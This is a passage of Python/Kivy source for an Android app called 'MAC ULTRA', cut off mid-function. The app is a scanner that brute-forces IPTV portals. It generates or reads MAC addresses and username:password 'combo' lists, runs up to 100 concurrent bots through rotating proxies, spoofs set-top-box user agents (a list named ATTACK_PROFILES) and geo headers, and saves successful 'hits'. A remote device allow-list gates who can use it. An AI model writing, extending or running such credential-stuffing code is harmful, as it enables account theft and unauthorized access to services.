import os, asyncio, time, urllib.parse, httpx, random, ssl, json, socket, hashlib, urllib.request
from datetime import datetime
from threading import Thread

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.utils import platform

# --- ANDROID 13/14 SPEICHER-FIX ---
def request_android_storage_permissions():
    """Fordert normale Medien-/Storage-Rechte an und öffnet bei Android 11+
    die Systemeinstellung für 'Alle Dateien Zugriff', damit öffentliche Ordner
    wie /storage/emulated/0/Combo wieder funktionieren."""
    if platform != "android":
        return

    try:
        from android.permissions import request_permissions, Permission
        perms = []

        for name in (
            "READ_EXTERNAL_STORAGE",
            "WRITE_EXTERNAL_STORAGE",
            "READ_MEDIA_IMAGES",
            "READ_MEDIA_VIDEO",
            "READ_MEDIA_AUDIO",
        ):
            if hasattr(Permission, name):
                perms.append(getattr(Permission, name))

        if perms:
            request_permissions(perms)
    except Exception:
        pass

    try:
        request_manage_all_files_access()
    except Exception:
        pass



def has_manage_all_files_access():
    if platform != "android":
        return True
    try:
        from jnius import autoclass
        Environment = autoclass("android.os.Environment")
        return bool(Environment.isExternalStorageManager())
    except Exception:
        return False


def request_manage_all_files_access():
    """Öffnet Android-Einstellung 'Alle Dateien Zugriff' für diese App.
    Der Nutzer muss dort MAC ULTRA erlauben."""
    if platform != "android":
        return
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        Settings = autoclass("android.provider.Settings")
        Intent = autoclass("android.content.Intent")
        Uri = autoclass("android.net.Uri")
        Environment = autoclass("android.os.Environment")

        if Environment.isExternalStorageManager():
            return

        activity = PythonActivity.mActivity
        package_name = activity.getPackageName()
        intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
        intent.setData(Uri.parse("package:" + package_name))
        activity.startActivity(intent)
    except Exception:
        try:
            from jnius import autoclass
            PythonActivity = autoclass("org.kivy.android.PythonActivity")
            Settings = autoclass("android.provider.Settings")
            Intent = autoclass("android.content.Intent")
            activity = PythonActivity.mActivity
            intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            activity.startActivity(intent)
        except Exception:
            pass


def get_android_external_app_dir():
    if platform != "android":
        return ""
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        activity = PythonActivity.mActivity
        folder = activity.getExternalFilesDir(None)
        if folder:
            return folder.getAbsolutePath()
    except Exception:
        pass
    return ""


def get_app_base_dir():
    try:
        app = App.get_running_app()
        if app and app.user_data_dir:
            return app.user_data_dir
    except Exception:
        pass
    return os.getcwd()


def get_data_dirs(kind):
    """Öffentliche Hauptspeicher-Ordner werden zuerst genutzt.
    App-Ordner bleiben als Fallback erhalten."""
    if kind == "Combo":
        dirs = [
            "/storage/emulated/0/Combo",
            "/sdcard/Combo",
            "/storage/emulated/0/Download/Combo",
            "/storage/emulated/0/Documents/Combo",
        ]
    elif kind == "Portals":
        dirs = [
            "/storage/emulated/0/Portals",
            "/sdcard/Portals",
        ]
    elif kind == "proxies":
        dirs = [
            "/storage/emulated/0/proxies",
            "/sdcard/proxies",
        ]
    elif kind == "Hits":
        dirs = [
            "/storage/emulated/0/Hits",
            "/sdcard/Hits",
        ]
    else:
        dirs = []

    ext_app = get_android_external_app_dir()
    if ext_app:
        dirs.append(os.path.join(ext_app, kind))

    dirs.append(os.path.join(get_app_base_dir(), kind))

    out = []
    for d in dirs:
        if d and d not in out:
            out.append(d)
    return out


def ensure_app_folders():
    for kind in ("Combo", "Portals", "proxies", "Hits"):
        for folder in get_data_dirs(kind):
            try:
                os.makedirs(folder, exist_ok=True)
            except Exception:
                pass


def first_existing_file(filename, folders):
    for folder in folders:
        path = os.path.join(folder, filename)
        if os.path.exists(path):
            return path
    return None


def first_writable_dir(kind):
    for folder in get_data_dirs(kind):
        try:
            os.makedirs(folder, exist_ok=True)
            test_file = os.path.join(folder, ".write_test")
            with open(test_file, "w", encoding="utf-8") as f:
                f.write("ok")
            try:
                os.remove(test_file)
            except Exception:
                pass
            return folder
        except Exception:
            continue
    return get_app_base_dir()


# --- ANDROID SPEICHERBERECHTIGUNG ---
def request_android_storage_permissions():
    if platform != "android":
        return
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
        ])
    except Exception:
        pass

def get_combo_dirs():
    dirs = [
        "/storage/emulated/0/Combo",
        "/sdcard/Combo",
        "/storage/emulated/0/Download/Combo",
        "/storage/emulated/0/Documents/Combo",
    ]
    try:
        app_dir = App.get_running_app().user_data_dir
        dirs.append(os.path.join(app_dir, "Combo"))
    except Exception:
        pass
    return dirs

def first_existing_file(filename, folders):
    for folder in folders:
        path = os.path.join(folder, filename)
        if os.path.exists(path):
            return path
    return None

# --- AUTOMATISCHE ORDNER-ERSTELLUNG & PFADE ---
def ensure_environment():
    ensure_app_folders()
    base_paths = [
        "/storage/emulated/0/Portals",
        "/storage/emulated/0/Hits/MAC-ULTRA-Hits/MAC_Hits",
        "/storage/emulated/0/Hits/MAC-ULTRA-Hits/M3U_Hits",
        "/storage/emulated/0/proxies",
        "/sdcard/Combo",
        "/storage/emulated/0/Combo",
        "/storage/emulated/0/Download/Combo",
        "/storage/emulated/0/Documents/Combo"
    ]
    for path in base_paths:
        try:
            os.makedirs(path, exist_ok=True)
        except Exception:
            pass

request_android_storage_permissions()
ensure_environment()

# --- ANDROID NATIVE AUDIO INITIALISIERUNG ---
try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

# --- KONFIGURATION & FARBEN ---
FAV_FILE = os.path.join(first_writable_dir("Portals"), "favoriten_liste.json")
# Pfad für Musik angepasst (Asset-Name statt Absolutpfad für APK)
MUSIC_PATH = "music.mp3" 
COMMON_PORTS = [80, 8080, 8880, 25461, 8000, 2082, 2086, 2095, 8443, 443]

# --- REMOTE SECURITY / FREISCHALTUNG ---
# Für echten Killswitch muss diese URL öffentlich erreichbar sein.
# Bei privatem GitHub-Repo funktioniert raw.githubusercontent.com ohne Token NICHT.
SECURITY_CONFIG_URL = "https://raw.githubusercontent.com/PetReturn/Fake/main/sys_config.json"
SECURITY_FAIL_CLOSED = True

def get_android_id():
    if platform != "android":
        return "DESKTOP-TEST"
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        SettingsSecure = autoclass("android.provider.Settings$Secure")
        activity = PythonActivity.mActivity
        resolver = activity.getContentResolver()
        return str(SettingsSecure.getString(resolver, SettingsSecure.ANDROID_ID))
    except Exception:
        return "UNKNOWN"

def fetch_security_config():
    try:
        req = urllib.request.Request(SECURITY_CONFIG_URL, headers={"User-Agent": "MAC-ULTRA-Android"})
        with urllib.request.urlopen(req, timeout=8) as r:
            data = json.loads(r.read().decode("utf-8"))
            return data if isinstance(data, dict) else None
    except Exception:
        return None

def is_device_allowed(config, android_id):
    if not isinstance(config, dict):
        return not SECURITY_FAIL_CLOSED
    if not config.get("system_active", True):
        return False
    allowed = config.get("allowed_devices", [])
    android_id = str(android_id).strip()
    for dev in allowed:
        if isinstance(dev, dict):
            if str(dev.get("device_id", "")).strip() == android_id:
                return True
        elif str(dev).strip() == android_id:
            return True
    return False


BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN = (0, 0.9, 1, 1)
GREEN = (0, 1, 0.5, 1)
RED = (1, 0.2, 0.2, 1)
YELLOW = (1, 0.8, 0, 1)
WHITE = (1, 1, 1, 1)

DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
)

ATTACK_PROFILES = [
    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, wie Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
    {'User-Agent': 'okhttp/4.9.1'},
    {'User-Agent': 'Kodi/20.2 (X11; Linux x86_64) App_Bitness/64'},
    {'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebkit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/76.0.3809.146 TV Safari/537.36'}
]

GEO_DATA = {
    'IT': {'ip': ['151', '185', '79', '93'], 'lang': 'it-IT,it;q=0.9', 'tz': 'Europe/Rome'},
    'DE': {'ip': ['85', '188', '93', '95'], 'lang': 'de-DE,de;q=0.9', 'tz': 'Europe/Berlin'},
    'FR': {'ip': ['5', '80', '78', '176'], 'lang': 'fr-FR,fr;q=0.9', 'tz': 'Europe/Paris'},
    'US': {'ip': ['3', '13', '34', '52'], 'lang': 'en-US,en;q=0.9', 'tz': 'America/New_York'},
    'ES': {'ip': ['83', '95', '79'], 'lang': 'es-ES,es;q=0.9', 'tz': 'Europe/Madrid'}
}

MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')

# --- STYLED COMPONENTS ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

# --- SCREENS ---

class SecurityGateScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.android_id = get_android_id()
        layout = BoxLayout(orientation="vertical", padding=[25, 45, 25, 25], spacing=18)
        layout.add_widget(Image(source='mac-ultra.png', size_hint_y=None, height=260, allow_stretch=True, keep_ratio=True))
        layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA SECURITY[/b][/color]", markup=True, font_size="26sp", size_hint_y=None, height=70))
        self.status_lbl = Label(text="Prüfe Gerätefreigabe...", markup=True, color=WHITE, font_size="17sp")
        layout.add_widget(self.status_lbl)
        self.id_lbl = Label(text=f"[color=FFFF00]Android-ID:[/color]\n{self.android_id}", markup=True, font_size="15sp", size_hint_y=None, height=95)
        layout.add_widget(self.id_lbl)
        btn_row = BoxLayout(size_hint_y=None, height=75, spacing=12)
        btn_row.add_widget(StyledButton(text="ID KOPIEREN", color=YELLOW, on_press=self.copy_id))
        btn_row.add_widget(StyledButton(text="NEU PRÜFEN", color=CYAN, on_press=self.check_access))
        layout.add_widget(btn_row)
        self.add_widget(layout)

    def on_enter(self):
        Clock.schedule_once(lambda dt: self.check_access(), 0.5)

    def copy_id(self, *a):
        Clipboard.copy(self.android_id)
        self.status_lbl.text = "[color=00FF00]Android-ID wurde kopiert. An Admin senden.[/color]"

    def check_access(self, *a):
        self.status_lbl.text = "[color=FFFF00]Prüfe Remote-Freigabe...[/color]"
        Thread(target=self._check_thread, daemon=True).start()

    def _check_thread(self):
        config = fetch_security_config()
        allowed = is_device_allowed(config, self.android_id)
        Clock.schedule_once(lambda dt: self._finish_check(allowed, config))

    def _finish_check(self, allowed, config):
        if allowed:
            self.status_lbl.text = "[color=00FF00]Gerät freigegeben. Weiterleitung...[/color]"
            Clock.schedule_once(lambda dt: setattr(self.manager, "current", "intro"), 0.8)
        else:
            reason = "Nicht freigeschaltet"
            if isinstance(config, dict) and not config.get("system_active", True):
                reason = "System ist aktuell gesperrt"
            elif config is None:
                reason = "Remote-Config nicht erreichbar"
            self.status_lbl.text = (
                f"[color=FF3333][b]ZUGRIFF GESPERRT[/b][/color]\n"
                f"{reason}\n\n"
                f"Sende deine Android-ID an den Admin."
            )


class IntroScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        with self.canvas.before:
            Color(0.01, 0.02, 0.04, 1)
            self.rect = RoundedRectangle(size=Window.size, pos=self.pos)
        self.bind(size=self._update_rect, pos=self._update_rect)

        layout = BoxLayout(orientation="vertical", padding=[20, 30, 20, 20], spacing=15)
        layout.add_widget(Image(source='mac-ultra.png', size_hint_y=None, height=260, allow_stretch=True, keep_ratio=True))

        scroll = ScrollView(size_hint=(1, 1))
        intro_text = Label(
            text=(
                "[color=00E6FF][b]WILLKOMMEN BEI MAC ULTRA V1[/b][/color]\n\n"
                "[b]1. Portal-Auswahl:[/b] Nutze Einzel-URLs, Listen oder Favoriten.\n\n"
                "[b]2. Scan-Modus:[/b] Wähle zwischen MAC-Handshake oder M3U Login.\n\n"
                "[b]3. Performance:[/b] Nutze Bots und Delay, um sauber zu arbeiten.\n\n"
                "[b]4. Proxys:[/b] Nutze eigene Listen oder lade Gratis-Proxys.\n\n"
                "[b]5. Detailgrad:[/b] Aktiviere 'ALLES SPEICHERN' für Filmlisten.\n\n"
                "[b]6. Speicher:[/b] Combos liegen in /storage/emulated/0/Combo. Nutze den SPEICHER Button.\n\n"
                "[b]7. Sicherheit:[/b] Nutzung nur mit freigegebener Android-ID.\n"
            ),
            markup=True,
            font_size="15sp",
            size_hint_y=None,
            halign="left",
            valign="top",
            color=(1, 1, 1, 1)
        )
        intro_text.bind(size=intro_text.setter('text_size'))
        intro_text.bind(texture_size=lambda instance, value: setattr(instance, 'height', value[1]))
        scroll.add_widget(intro_text)
        layout.add_widget(scroll)

        start_btn = StyledButton(
            text="ZUM SCANNER WEITERLEITEN",
            size_hint_y=None,
            height=80,
            bg_color=(0, 0.25, 0.35, 1),
            color=CYAN,
            bold=True,
            on_press=self.go_to_scanner
        )
        layout.add_widget(start_btn)
        self.add_widget(layout)

    def _update_rect(self, instance, value):
        self.rect.pos = self.pos
        self.rect.size = self.size

    def go_to_scanner(self, *a):
        self.manager.current = 'main'


class PortalManagerScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.layout = BoxLayout(orientation="vertical", padding=[20, 40, 20, 20], spacing=15)
        self.layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="28sp"))
        input_card = StyledCard(orientation="vertical", size_hint_y=None, height=220, padding=15, spacing=12)
        self.new_portal_input = TextInput(hint_text="http://url.com:8080", multiline=False, size_hint_y=None, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=(1,1,1,1), padding=[10, 20])
        row = BoxLayout(size_hint_y=None, height=65, spacing=15)
        self.type_spinner = StyledSpinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"), color=CYAN, bold=True)
        add_btn = StyledButton(text="HINZUFÜGEN", bg_color=(0.05, 0.15, 0.1, 1), color=GREEN, on_press=self.add_portal)
        row.add_widget(self.type_spinner); row.add_widget(add_btn)
        input_card.add_widget(self.new_portal_input); input_card.add_widget(row)
        self.layout.add_widget(input_card)
        header_row = BoxLayout(size_hint_y=None, height=30)
        header_row.add_widget(Label(text="MAC LISTE", color=YELLOW, bold=True)); header_row.add_widget(Label(text="M3U LISTE", color=CYAN, bold=True))
        self.layout.add_widget(header_row)
        lists_container = BoxLayout(spacing=15)
        self.mac_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
        self.m3u_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
        sc1 = ScrollView(); sc1.add_widget(self.mac_list); sc2 = ScrollView(); sc2.add_widget(self.m3u_list)
        lists_container.add_widget(sc1); lists_container.add_widget(sc2)
        self.layout.add_widget(lists_container)
        self.layout.add_widget(StyledButton(text="ZURÜCK ZUM SCANNER", size_hint_y=None, height=100, on_press=self.go_back, color=RED, bold=True))
        self.add_widget(self.layout)

    def load_favs(self):
        self.mac_list.clear_widgets()
        self.m3u_list.clear_widgets()
        data = {"mac": [], "m3u": []}

        if os.path.exists(FAV_FILE):
            try:
                with open(FAV_FILE, 'r', encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, dict):
                        data["mac"] = loaded.get("mac", [])
                        data["m3u"] = loaded.get("m3u", [])
            except Exception:
                data = {"mac": [], "m3u": []}

        for url in data.get("mac", []):
            self.mac_list.add_widget(self.create_entry(url, "mac"))
        for url in data.get("m3u", []):
            self.m3u_list.add_widget(self.create_entry(url, "m3u"))


    def create_entry(self, url, p_type):
        card = StyledCard(size_hint_y=None, height=70, padding=5, spacing=5)
        btn = StyledButton(text=url.replace("http://", "").replace("https://", "")[:20], font_size="12sp", on_press=lambda x: self.copy_and_back(url))
        del_btn = StyledButton(text="X", size_hint_x=0.25, bg_color=(0.3, 0.05, 0.05, 1), color=RED, on_press=lambda x: self.delete_portal(url, p_type))
        card.add_widget(btn); card.add_widget(del_btn); return card

    def add_portal(self, *a):
        url = self.new_portal_input.text.strip()
        if not url.startswith("http"):
            return

        p_type = "mac" if "MAC" in self.type_spinner.text else "m3u"
        data = {"mac": [], "m3u": []}

        if os.path.exists(FAV_FILE):
            try:
                with open(FAV_FILE, 'r', encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, dict):
                        data["mac"] = loaded.get("mac", [])
                        data["m3u"] = loaded.get("m3u", [])
            except Exception:
                pass

        if url not in data[p_type]:
            data[p_type].append(url)

        os.makedirs(os.path.dirname(FAV_FILE), exist_ok=True)
        with open(FAV_FILE, 'w', encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        self.new_portal_input.text = ""
        self.load_favs()

        try:
            main = self.manager.get_screen('main')
            main.portal_input.text = url
            main.refresh_portal_lists()
            main.update_log_safe("[color=00FF00][FAVORIT][/color] Favorit gespeichert.")
        except Exception:
            pass


    def delete_portal(self, url, p_type):
        data = {"mac": [], "m3u": []}
        if os.path.exists(FAV_FILE):
            try:
                with open(FAV_FILE, 'r', encoding="utf-8") as f:
                    loaded = json.load(f)
                    if isinstance(loaded, dict):
                        data["mac"] = loaded.get("mac", [])
                        data["m3u"] = loaded.get("m3u", [])
            except Exception:
                pass

        if url in data.get(p_type, []):
            data[p_type].remove(url)

        os.makedirs(os.path.dirname(FAV_FILE), exist_ok=True)
        with open(FAV_FILE, 'w', encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)

        self.load_favs()
        try:
            self.manager.get_screen('main').refresh_portal_lists()
        except Exception:
            pass


    def copy_and_back(self, url):
        Clipboard.copy(url); self.manager.get_screen('main').portal_input.text = url; self.manager.current = 'main'

    def go_back(self, *a): self.manager.current = 'main'

class MagUltraScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = BG_DARK
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        self.proxy_list, self.working_proxies, self.use_proxies = [], [], False
        self.error_streak = 0; self.request_count = 0
        self.portal_isp = "Unknown"
        self.current_api_path = "/player_api.php"
        self.current_api_method = "GET"
        
        # UI - Pfad für Logo auf Asset-Name geändert (für APK)
        self.box.add_widget(Image(source='mac-ultra.png', size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
        self.box.add_widget(stats)
        
        url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
        self.portal_input = TextInput(text="http://", multiline=False, size_hint_y=None, height=75)
        
        filter_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = StyledSpinner(text="SELECT PORTAL LIST", values=self.load_portal_lists(), size_hint_x=0.6, color=YELLOW)
        self.country_filter = TextInput(hint_text="LAND (z.B. DE)", multiline=False, size_hint_x=0.4, background_color=(0.1, 0.12, 0.15, 1), foreground_color=WHITE, padding=[10, 15])
        filter_row.add_widget(self.portal_file_spinner); filter_row.add_widget(self.country_filter)
        
        det_row = BoxLayout(size_hint_y=None, height=50, spacing=10)
        self.engine_mode = StyledSpinner(text="MAC/M3U SCAN", values=("MAC SCAN", "M3U SCAN"), size_hint_x=0.4, color=CYAN)
        self.detail_slider = Slider(min=0, max=1, value=0, step=1, size_hint_x=0.2); self.detail_status = Label(text="NUR MAC/URL", color=RED, size_hint_x=0.4)
        self.detail_slider.bind(value=self.update_slider_label); det_row.add_widget(self.engine_mode); det_row.add_widget(self.detail_slider); det_row.add_widget(self.detail_status)
        btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
        btn_row.add_widget(StyledButton(text="PASTE", on_press=self.paste_clip, color=CYAN))
        btn_row.add_widget(StyledButton(text="FAVORITEN", on_press=self.go_to_manager, color=YELLOW))
        url_card.add_widget(self.portal_input); url_card.add_widget(filter_row); url_card.add_widget(det_row); url_card.add_widget(btn_row); self.box.add_widget(url_card)
        
        cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=430, padding=15, spacing=10)
        m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
        self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN")); self.prefix_spinner = StyledSpinner(text="MAC's", values=MAC_VARIANTS, color=YELLOW)
        m_row.add_widget(self.scan_mode); m_row.add_widget(self.prefix_spinner)
        combo_row = BoxLayout(size_hint_y=None, height=65, spacing=10)
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), color=CYAN, size_hint_x=0.68)
        self.refresh_combo_btn = StyledButton(text="REFRESH", color=YELLOW, size_hint_x=0.32, on_press=self.refresh_file_lists)
        combo_row.add_widget(self.file_spinner)
        combo_row.add_widget(self.refresh_combo_btn)

        random_row = BoxLayout(size_hint_y=None, height=85, spacing=10)
        random_row.add_widget(Label(text="ANZAHL", color=YELLOW, size_hint_x=0.28, bold=True))
        self.random_count = TextInput(
            text="1000",
            input_filter="int",
            multiline=False,
            size_hint_x=0.72,
            height=85,
            font_size="26sp",
            halign="center",
            background_color=(0.95, 0.95, 0.95, 1),
            foreground_color=(0, 0, 0, 1),
            padding=[10, 22]
        )
        random_row.add_widget(self.random_count)
        
        delay_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.delay_mode_spinner = StyledSpinner(text="NORMAL", values=("NORMAL", "SMART: 1-3s", "SMART: 2-4s", "SMART: 3-6s"), color=YELLOW)
        self.delay_value_display = Label(text="0.10s", color=YELLOW, size_hint_x=0.2); self.delay_slider = Slider(min=0.0, max=2.0, value=0.1, step=0.05, size_hint_x=0.4)
        self.delay_slider.bind(value=lambda i, v: setattr(self.delay_value_display, 'text', f"{v:.2f}s"))
        delay_row.add_widget(self.delay_mode_spinner); delay_row.add_widget(self.delay_value_display); delay_row.add_widget(self.delay_slider)
        
        bot_row = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.bot_label = Label(text="BOTS: 40", color=CYAN, size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1, size_hint_x=0.7)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)

        cfg_card.add_widget(m_row); cfg_card.add_widget(combo_row); cfg_card.add_widget(random_row); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row)
        self.box.add_widget(cfg_card)
        
        proxy_card = StyledCard(orientation="horizontal", size_hint_y=None, height=70, padding=10, spacing=10)
        self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.28)
        self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.28)
        self.proxy_toggle_btn = StyledButton(text="PROXY: OFF", size_hint_x=0.22, color=RED, on_press=self.toggle_proxy)
        self.storage_btn = StyledButton(text="SPEICHER", size_hint_x=0.22, color=YELLOW, on_press=self.open_storage_settings)
        proxy_card.add_widget(self.proxy_source)
        proxy_card.add_widget(self.proxy_spinner)
        proxy_card.add_widget(self.proxy_toggle_btn)
        proxy_card.add_widget(self.storage_btn)
        self.box.add_widget(proxy_card)
        
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN); self.box.add_widget(self.progress_label); self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10); self.box.add_widget(self.pbar)
        self.scroll = ScrollView(); self.log_display = Label(text="Ready...", font_size="14sp", size_hint_y=None, markup=True, halign="left", valign="top"); self.log_display.bind(size=self.log_display.setter('text_size')); self.scroll.add_widget(self.log_display); self.box.add_widget(self.scroll)
        
        bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
        self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
        self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, on_press=self.stop_native_audio, bg_color=(0.15, 0.05, 0.05, 1), color=RED)
        bottom_row.add_widget(self.start_btn); bottom_row.add_widget(self.music_stop_btn)
        self.box.add_widget(bottom_row)
        self.add_widget(self.box)
        Clock.schedule_once(lambda dt: self.refresh_file_lists(), 1)
        Clock.schedule_once(lambda dt: self.check_storage_status(), 2)

    async def find_working_port(self, base_url):
        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
        self.update_log_safe(f"[color=FFFF00][SCAN][/color] Testing Ports for {clean_url}...")
        for port in COMMON_PORTS:
            if not self.running: return None
            Clock.schedule_once(lambda dt: setattr(self.status_code_label, 'text', f"P:{port}"))
            try:
                conn = asyncio.open_connection(clean_url, port)
                _, writer = await asyncio.wait_for(conn, timeout=1.2)
                writer.close()
                await writer.wait_closed()
                
                async with httpx.AsyncClient(timeout=1.5) as client:
                    test_url = f"http://{clean_url}:{port}"
                    r = await client.get(test_url)
                    if r.status_code in [200, 404, 403]:
                        self.update_log_safe(f"[color=00FF00][FOUND][/color] Port {port} is OPEN!")
                        return test_url
            except: continue
        return None

    async def discover_best_api(self, portal, ctx):
        endpoints = [
            {"name": "Player GET", "path": "/player_api.php", "method": "GET"},
            {"name": "Player POST", "path": "/player_api.php", "method": "POST"},
            {"name": "Panel GET", "path": "/panel_api.php", "method": "GET"},
        ]
        self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
        async with httpx.AsyncClient(verify=ctx, timeout=5.0) as client:
            for ep in endpoints:
                if not self.running: break
                try:
                    if ep["method"] == "GET":
                        r = await client.get(f"{portal}{ep['path']}?username=test&password=test")
                    else:
                        r = await client.post(f"{portal}{ep['path']}", data={"username": "test", "password": "test"})
                    if r.status_code == 200:
                        self.update_log_safe(f"[color=00FF00][API][/color] Nutze {ep['name']}")
                        return ep['path'], ep['method']
                except: continue
        return "/player_api.php", "GET"

    def check_vpn_restriction(self, response_text):
        triggers = ["blocked", "vpn", "proxy", "country lock", "not available in your country"]
        return any(t in response_text.lower() for t in triggers)

    async def get_vpn_info_api(self, ip):
        if not ip or ip == "Unknown": return "No IP"
        try:
            async with httpx.AsyncClient(timeout=4) as client:
                r = await client.get(f"http://ip-api.com/json/{ip}")
                data = r.json()
                if data.get('status') == 'success':
                    isp = data.get('isp', 'Unknown')
                    is_vpn = " [🔒 VPN/DATA]" if data.get('hosting', False) or "VPN" in isp.upper() else ""
                    return f"{data.get('countryCode', '??')}{is_vpn}"
        except: pass
        return "N/A"

    def play_native_audio(self):
        if not HAS_JNIUS: return
        # Prüfen ob music.mp3 als Asset im APK-Bundle liegt
        try:
            mPlayer.reset()
            # In Kivy/Buildozer liegen Assets oft im aktuellen Verzeichnis
            if os.path.exists("music.mp3"):
                mPlayer.setDataSource("music.mp3")
            elif os.path.exists(MUSIC_PATH): # Fallback
